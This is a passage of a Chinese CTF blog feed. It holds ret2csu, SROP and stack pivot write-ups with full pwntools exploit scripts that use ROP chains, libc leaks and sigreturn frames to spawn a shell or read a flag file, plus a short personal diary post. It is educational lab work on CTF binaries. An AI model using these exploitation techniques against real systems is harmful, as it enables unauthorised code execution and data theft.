libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br></code></pre></td></tr></table></figure><p>接下来，我们把字符串<code>/bin/sh</code>和<code>system</code>的真实地址写到bss段上</p><p>第二阶段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x88</span><br>payload2 += p64(gadget1)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">1</span>)<br>payload2 += p64(read_got) + p64(<span class="hljs-number">0</span>)<br>payload2 += p64(bss_addr) + p64(<span class="hljs-number">16</span>)<br>payload2 += p64(gadget2)<br>payload2 += <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span><br>payload2 += p64(main_addr)<br><br>p.send(payload2)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.send(p64(sys_addr))<br>p.send(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>这样，我们将rdi设置为<code>/bin/sh</code>所在的地址，并将r12设置为system所在的地址，即可实现<code>call system</code>并获得shell</p><p>最终阶段:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload3 = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x88</span><br>payload3 += p64(gadget1)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">1</span>)<br>payload3 += p64(bss_addr) + p64(bss_addr+<span class="hljs-number">8</span>)<br>payload3 += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(gadget2)<br>payload3 += <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x38</span><br>payload3 += p64(main_addr)<br><br>sleep(<span class="hljs-number">1</span>)<br>p.send(payload3)<br></code></pre></td></tr></table></figure><p>最后也是拿到shell啦~</p><p>你也来试试吧!</p><p>感谢阅读…</p><p>最后还是贴一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>main_addr = <span class="hljs-number">0x400564</span><br>bss_addr = <span class="hljs-number">0x601028</span><br>gadget1 = <span class="hljs-number">0x400606</span><br>gadget2 = <span class="hljs-number">0x4005f0</span><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span><br>payload1 += p64(gadget1)<br>payload1 += p64(<span class="hljs-number">0</span>)<br>payload1 += p64(<span class="hljs-number">0</span>)<br>payload1 += p64(<span class="hljs-number">1</span>)<br>payload1 += p64(write_got) + p64(<span class="hljs-number">1</span>)<br>payload1 += p64(write_got) + p64(<span class="hljs-number">8</span>)<br>payload1 += p64(gadget2)<br>payload1 += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x38</span><br>payload1 += p64(main_addr)<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>p.send(payload1)<br><br>sleep(<span class="hljs-number">1</span>)<br><br>leak = p.recv(<span class="hljs-number">8</span>)<br>write_addr = u64(leak.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>libc_base = write_addr - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x88</span><br>payload2 += p64(gadget1)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">1</span>)<br>payload2 += p64(read_got) + p64(<span class="hljs-number">0</span>)<br>payload2 += p64(bss_addr) + p64(<span class="hljs-number">16</span>)<br>payload2 += p64(gadget2)<br>payload2 += <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span><br>payload2 += p64(main_addr)<br><br>p.send(payload2)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.send(p64(sys_addr))<br>p.send(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload3 = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x88</span><br>payload3 += p64(gadget1)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">1</span>)<br>payload3 += p64(bss_addr) + p64(bss_addr+<span class="hljs-number">8</span>)<br>payload3 += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(gadget2)<br>payload3 += <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x38</span><br>payload3 += p64(main_addr)<br><br>sleep(<span class="hljs-number">1</span>)<br>p.send(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ps:千万别说我偷懒…</p><p>2026.2.11吐槽:</p><hr><p>在比赛给的elf文件中从来没有看到过csu gadget</p><p>感受呢!!!</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2csu</tag>
      
      <tag>gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello pwn!</title>
    <link href="/2025/12/25/hello-pwn/"/>
    <url>/2025/12/25/hello-pwn/</url>
    
    <content type="html"><![CDATA[<p>为什么写blog?</p><p>为什么打ctf?</p><p>为什么选择pwn?</p><p>鬼知道</p><p>也许是无聊吧</p><p>用此博客来记录我在<code>pwn</code>学习过程中的一些题解与思考</p><p>希望你能有所收获…</p><p>ps:自言自语</p><p>bro以为自己是网红blogger</p><p>实则静态博客闹麻了</p><p>不过写给以后的自己看似乎也不错???</p><hr><p>modification:</p><p>于2026.1.1</p><p>最近学习了一些栈漏洞</p><p>本打算继续学堆</p><p>但是我要先摆几天</p><p>期末还没复习</p><p>不重要了</p><p>最讨厌的就是卷成绩这种事</p><p>最后</p><p>不止于pwn</p><p>move forward!</p><p>patience is key in life…</p><p>ps:大一上</p><hr><p>补充:</p><p>2026.2.2</p><p>随记</p><p>不知道干嘛</p><p>还是奉行我的人生信条吧</p><p>做自己想做的!</p><p>我感觉的coding能力似乎也太差了，有点过于依赖ai了…</p><p>关于怎么提升也没有什么头绪，也许需要学点数据结构与算法?</p><p>还是做一些项目？</p><p>都试试吧</p><p>尝试新的事物总是很有趣</p><p>顺便借着pwn补补os和计组</p><p>misc osint web crypto reverse嘛</p><p>看看就好</p><p>主要还是没有pwn的那种谜之魅力</p><p>不过我还是太贪玩了</p><p>虽说做出算法题 or pwn题的即时反馈之乐趣也很诱人</p><p>但终究有一定的<code>时间成本</code></p><p>而手机这种低成本的娱乐方式太难以抵抗了!</p><p>不过这也是生活啊~</p><p>最近还和高中同学reunion</p><p>仿佛回到了那个无忧无虑的高三…</p><p>大概就是这样吧</p><p>现在是大一上的寒假</p><p>多年后的我</p><p>祝你看到这些的时候坚守初心</p><p>但也天天开心</p><p>有点唐</p><p>不过</p><p>确实挺不错的</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hello,World!</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/2025/12/25/SROP/"/>
    <url>/2025/12/25/SROP/</url>
    
    <content type="html"><![CDATA[<p>建议先看stack pivot再来这里…</p><p>ok题目来自XSWCTF2025初赛的一道<code>pwn</code>，考察了更加精妙的栈风水布局(基于stack pivot)，同时融合着SROP和ORW，来看看吧!</p><p>ps:虽然比赛时我也没做出来(x_x)</p><p>先看一下题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  undefined1 local_78 [<span class="hljs-number">108</span>];<br>  undefined4 local_c;<br>  <br>  local_c = <span class="hljs-number">0</span>;<br>  setbuf(<span class="hljs-built_in">stdin</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>);<br>  sandbox();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hey hey what are you doing here?&quot;</span>);<br>  FUN_004010e0(<span class="hljs-number">0</span>,local_78,<span class="hljs-number">0x50</span>);   #第一次read，没有溢出<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I say STOP doing this!&quot;</span>);<br>  FUN_004010e0(<span class="hljs-number">0</span>,local_78,<span class="hljs-number">0x200</span>);  #第二次read，存在溢出<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>保护虽然只有<code>NX</code>，但是同时开启了<code>seccomp</code>沙箱(sandbox)，使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><p>查看，发现禁用了<code>execve</code>，所以只能打ORW(open,read,write)，让我们找找关于寄存器的gadget，额，竟然什么都找不到…</p><p>但是我们找到了一个<code>syscall</code>的汇编指令，所以在这种情况下，我们就要使用一招系统内核级的利用，<code>SROP</code>，linux存在一种信号处理机制，当进程收到信号时，内核会先暂停进程执行，然后保存当前寄存器状态到用户栈(sigcontext)，接下来跳转到信号处理函数，等信号处理函数执行完毕后，调用<code>sigreturn</code>系统调用，内核从栈上恢复寄存器状态，因此，我们可以伪造sigcontext结构，同时设置<code>rax</code>为<code>sigreturn</code>的系统调用号<code>15</code>(x86-64)，并执行<code>syscall</code>指令触发<code>sigreturn</code>机制，内核便会从我们伪造的<code>sigcontext</code>中恢复所有我们所设定的寄存器值，从而完全控制进程执行流!</p><p>然而还有一个关键点在于如何将rax设置为15，因为并没有<code>pop rax; ret;</code>的gadget，这时，”不难”想到，rax寄存器上保存的是函数的返回值，我们可以在read时读入15个字节长度的数据，此时rax便被巧妙地设置为了15，此时再执行syscall即可调用sigreturn机制打我们的<code>SROP</code>了</p><p>当然，为了不破坏栈的结构，我们仍然需要利用<code>stack pivot</code>迁移至bss段上伪造我们的栈帧并布局我们的利用链…</p><p>先把有用的地址列出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read = <span class="hljs-number">0x4012a9</span>    <span class="hljs-comment">#对应执行我们的第二次read的地址</span><br>syscall = <span class="hljs-number">0x4012fa</span><br>leave_ret = <span class="hljs-number">0x4012d3</span>    <span class="hljs-comment">#栈迁移的关键</span><br>puts_got = <span class="hljs-number">0x404010</span><br>puts_plt = <span class="hljs-number">0x4010b0</span><br>bss = <span class="hljs-number">0x404090</span> + <span class="hljs-number">0x500</span>  <span class="hljs-comment">#0x404590(布局的地方)</span><br></code></pre></td></tr></table></figure><p>第一次的read直接跳过，来到我们的第二次read，首先将<code>rbp</code>迁移至bss段，并重新执行一次read(想必都会了吧)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendafter(<span class="hljs-string">b&quot;re you doing here?\n&quot;</span>,<span class="hljs-string">b&quot;beef&quot;</span>)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x70</span> + p64(bss) + p64(read))<br></code></pre></td></tr></table></figure><p>这时在bss段上形成了新的栈帧，我们步骤好srop的<code>sigcontext</code>以泄露libc基址，并进行第二次段内迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = p64(bss + <span class="hljs-number">0x10</span>) + p64(read)   <br>payload = payload.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(bss - <span class="hljs-number">0x70</span>)<br>payload += p64(leave_ret)<br>payload += p64(bss+<span class="hljs-number">0x100</span>)<br>payload += p64(syscall)<br><br>frame3 = SigreturnFrame()<br>frame3.rip = puts_plt<br>frame3.rsp = bss - <span class="hljs-number">0x60</span> + <span class="hljs-number">8</span><br>frame3.rbp = bss + <span class="hljs-number">0x210</span><br>frame3.rax = <span class="hljs-number">15</span><br>frame3.rdi = puts_got<br>frame3.rsi = <span class="hljs-number">0</span><br>frame3.rdx = <span class="hljs-number">0</span><br><br>payload += <span class="hljs-built_in">bytes</span>(frame3)<br><br>p.send(payload)<br></code></pre></td></tr></table></figure><p>发送完这次payload后再次执行<code>read</code>，我们发送15字节长度的数据以将<code>rax</code>设置为15，同时注意，此时经过我们的布置，<code>rbp</code>目前在<code>0x4045a0</code>的位置，刚好新栈帧<code>rip</code>返回地址的位置便是我们的<code>syscall</code>和<code>sigcontext</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,p64(bss) + <span class="hljs-string">b&quot;\xa9\x12\x40\x00\x00\x00\x00&quot;</span>)<br></code></pre></td></tr></table></figure><p>这次便会真正执行到我们的sigcontext中所设置的寄存器，即，泄露puts真实地址，从而得到libc基址，继而得到open,read,write和所需gadget的地址，而<code>rbp</code>被设置到更上方的地址再次布局我们最后的<code>ORW</code>，<code>rsp</code>设置在了我们先前<code>read</code>指令的所在地，因此，进行最后一次read，直接布置最终的rop链…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">open</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rread=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi=libc_base+<span class="hljs-number">0x10f78b</span><br>rsi=libc_base+<span class="hljs-number">0x110a7d</span><br>rdx=<span class="hljs-number">0x4012fc</span><br>ret=libc_base+<span class="hljs-number">0x2882f</span><br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(bss+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rdi) + p64(bss+<span class="hljs-number">0x210</span>) + p64(rsi) + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-built_in">open</span>)  <span class="hljs-comment">#bss+0x210就是flag字符串的地址!</span><br>payload += p64(rdi) + p64(<span class="hljs-number">3</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rread)  <span class="hljs-comment">#3为fd,rsi随便放哪里好了...</span><br>payload += p64(rdi) + p64(<span class="hljs-number">1</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(write)  <span class="hljs-comment">#将flag写到stdout，注意对齐...</span><br></code></pre></td></tr></table></figure><p>最终，在精妙的布局与利用下，我们成功获得了flag…</p><p>由于迷失于错综的地址，当时我也是对着<code>gdb</code>调试了老半天才算看懂这道题的wp，写出来过程也算了却一下自己的心魔，依旧贴一张图帮助你思考…</p><p><img src="/images/5.png" alt="内存布局"></p><p>最后贴一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">40315</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>read = <span class="hljs-number">0x4012a9</span><br>syscall = <span class="hljs-number">0x4012fa</span><br>leave_ret = <span class="hljs-number">0x4012d3</span><br>puts_got = <span class="hljs-number">0x404010</span><br>puts_plt = <span class="hljs-number">0x4010b0</span><br>bss = <span class="hljs-number">0x404090</span> + <span class="hljs-number">0x500</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br><br>p.sendafter(<span class="hljs-string">b&quot;re you doing here?\n&quot;</span>,<span class="hljs-string">b&quot;beef&quot;</span>)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x70</span> + p64(bss) + p64(read))<br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = p64(bss + <span class="hljs-number">0x10</span>) + p64(read)<br>payload = payload.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(bss-<span class="hljs-number">0x70</span>)<br>payload += p64(leave_ret)<br>payload += p64(bss+<span class="hljs-number">0x100</span>)<br>payload += p64(syscall)<br><br>frame3 = SigreturnFrame()<br>frame3.rip = puts_plt<br>frame3.rsp = bss-<span class="hljs-number">0x60</span>+<span class="hljs-number">8</span><br>frame3.rbp = bss+<span class="hljs-number">0x210</span><br>frame3.rax = <span class="hljs-number">15</span><br>frame3.rdi = puts_got<br>frame3.rsi = <span class="hljs-number">0</span><br>frame3.rdx = <span class="hljs-number">0</span><br><br>payload += <span class="hljs-built_in">bytes</span>(frame3)<br><br>p.send(payload)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,p64(bss) + <span class="hljs-string">b&quot;\xa9\x12\x40\x00\x00\x00\x00&quot;</span>)<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">open</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rread=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi=libc_base+<span class="hljs-number">0x10f78b</span><br>rsi=libc_base+<span class="hljs-number">0x110a7d</span><br>rdx=<span class="hljs-number">0x4012fc</span><br>ret=libc_base+<span class="hljs-number">0x2882f</span><br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(bss+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rdi) + p64(bss+<span class="hljs-number">0x210</span>) + p64(rsi) + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-built_in">open</span>)<br>payload += p64(rdi) + p64(<span class="hljs-number">3</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rread)<br>payload += p64(rdi) + p64(<span class="hljs-number">1</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(write)<br><br>p.send(payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>就到这里便结束了，感谢阅读，生活愉快…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内存布局</tag>
      
      <tag>SROP</tag>
      
      <tag>栈迁移</tag>
      
      <tag>ret2libc</tag>
      
      <tag>ORW</tag>
      
      <tag>寄存器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stack pivot</title>
    <link href="/2025/12/25/stack-pivot/"/>
    <url>/2025/12/25/stack-pivot/</url>
    
    <content type="html"><![CDATA[<p>题目出自哪里已经记不真切了</p><p>只依稀记得这是我正式做的第一道pwn题，当时的我就像刚出新手村的菜鸟遇见了大boss一般，与其鏖战了数个日夜才终于拿下</p><p>来看看吧!</p><p>题目逻辑非常之简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  undefined1 local_58 [<span class="hljs-number">80</span>];<br>  <br>  init(param_1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Xswlhhh!Use stack hijacking on him!&quot;</span>);<br>  read(<span class="hljs-number">0</span>,local_58,<span class="hljs-number">0x60</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目的保护只有<code>NX</code></p><p>但是这在当时对于只会无脑溢出覆盖返回地址的我来说宛如噩梦，设置了local_58[80]，然而read只有0x60的大小，也就是说算上<code>saved rbp</code>只剩下最后的8个字节供我覆盖rip，而题目又有<code>NX</code>，长度完全不够执行rop链!怎么办呢?我查询资料，得知存在一种技术叫做:<code>栈迁移(stack pivot)</code></p><p>原理在于，将<code>saved rbp</code>覆盖为你想让rbp去的地方，将rip覆盖为再执行一次read的地址，因此执行逻辑便变为，main函数结束后，即将退出，执行<code>leave; ret;</code>的指令，而<code>saved rbp</code>已经被设置为我们想让它去的地方(通常是一个可读可写的地址段)，rip又一次执行read，最后在那个段空间重新分配一个新的栈帧，供我们自由发挥</p><p>这里有一些前置知识需要理解，当时困扰了我许久，现在写下来，首先是<code>leave; ret;</code>干了什么，你可以将其理解为两个阶段，先是leave，其相当于<code>mov rsp,rbp</code>和<code>pop rbp</code>，注意，最后，<code>rsp += 8</code>，然后执行<code>ret</code>指令，相当于<code>rip = *rsp</code>，注意，同样，<code>rsp += 8</code>，接下来，如何理解栈帧?其实cpu并不在乎rbp在哪里，它只关心执行流要干什么事儿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">LEA RAX =&gt; local_58,[RBP + -0x50]<br></code></pre></td></tr></table></figure><p>read始于local_58[80]的地址，local_58[80]这个数组始终位于<code>rbp - 0x50</code>的位置，而<code>rbp + 